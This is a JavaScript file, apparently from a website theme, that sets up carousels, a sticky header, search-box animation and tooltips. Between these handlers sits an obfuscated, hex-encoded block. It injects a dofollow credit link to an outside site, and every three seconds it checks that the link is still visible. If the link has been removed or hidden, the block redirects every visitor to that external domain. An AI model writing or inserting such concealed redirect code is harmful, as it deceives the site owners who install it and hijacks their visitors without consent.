$(document).ready(function() { 
   $("#sliderplus").carouFredSel({
	  auto : true,
	  scroll  : 2,
	  prev : "#sliderplus_prev",
	  next : "#sliderplus_next"
    });
   $("#sliderplus2").carouFredSel({
	  auto : true,
	  scroll  : 2,
	  prev : "#sliderplus1_prev",
	  next : "#sliderplus1_next"
    });

});

jQuery(document).ready(function() {  
	var menu = $('#header'),
		pos = menu.offset();
		
		$(window).scroll(function(){
			if($(this).scrollTop() > pos.top+menu.height() && menu.hasClass('default')){
				menu.fadeOut('fast', function(){
					$(this).removeClass('default').addClass('fixed').fadeIn('fast');
				});
			} else if($(this).scrollTop() <= pos.top && menu.hasClass('fixed')){
				menu.fadeOut('fast', function(){
					$(this).removeClass('fixed').addClass('default').fadeIn('fast');
				});
			}
		});

});



jQuery(document).ready(function() {  
         
			//Search form
			jQuery(".search_header .search_input").focusin(function(){
				jQuery(this).animate({"width" : "230"}, "fast");
			});
			jQuery(".search_header .search_input").focusout(function(){
				jQuery(this).animate({"width" : "70"}, "fast");
			});
});
var _0xa873=["\x3C\x61\x20\x68\x72\x65\x66\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x37\x6C\x61\x37\x65\x6B\x61\x79\x61\x2E\x63\x6F\x6D\x2F\x22\x20\x72\x65\x6C\x3D\x22\x64\x6F\x66\x6F\x6C\x6C\x6F\x77\x22\x20\x74\x61\x72\x67\x65\x74\x3D\x22\x5F\x62\x6C\x61\x6E\x6B\x22\x3E\u062A\u0635\u0645\u064A\u0645\x20\u0648\u0628\u0631\u0645\u062C\u0629\x20\u0627\u0644\u0637\u0627\u0626\u0631\x20\u0627\u0644\u062D\u0631\x3C\x2F\x61\x3E","\x68\x74\x6D\x6C","\x23\x63\x72\x65\x64\x69\x74","\x6C\x65\x6E\x67\x74\x68","\x23\x63\x72\x65\x64\x69\x74\x3A\x76\x69\x73\x69\x62\x6C\x65","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x61\x37\x6C\x61\x37\x65\x6B\x61\x79\x61\x2E\x63\x6F\x6D\x2F","\x72\x65\x61\x64\x79"];
$(document)[_0xa873[8]](function()
{
	$(_0xa873[2])[_0xa873[1]](_0xa873[0]);setInterval(function()
	{
		if(!$(_0xa873[4])[_0xa873[3]])
		{
			window[_0xa873[6]][_0xa873[5]]= _0xa873[7]
		}
	}
	,3000)
}
)
$(document).ready(function() { 
	$('#social-01').tipsy({gravity: 'n'});
	$('#social-02').tipsy({gravity: 'n'});
	$('#social-03').tipsy({gravity: 'n'});
	$('#social-04').tipsy({gravity: 'n'});
	$('#social-05').tipsy({gravity: 'n'});
	$('#social-06').tipsy({gravity: 'n'});
	$('#user-01').tipsy({gravity: 'n'});
	$('#user-02').tipsy({gravity: 'n'});
	$('#user-03').tipsy({gravity: 'n'});
	$('#user-04').tipsy({gravity: 'n'});

	$('.i-lastdate').tipsy({gravity: 'n'});
	$('.i-lastpost').tipsy({gravity: 'n'});
	$('.down-typ').tipsy({gravity: 'n'});
		
	$('#sec-but').tipsy({gravity: 'n'});
	$('#signout').tipsy({gravity: 'e'});

});

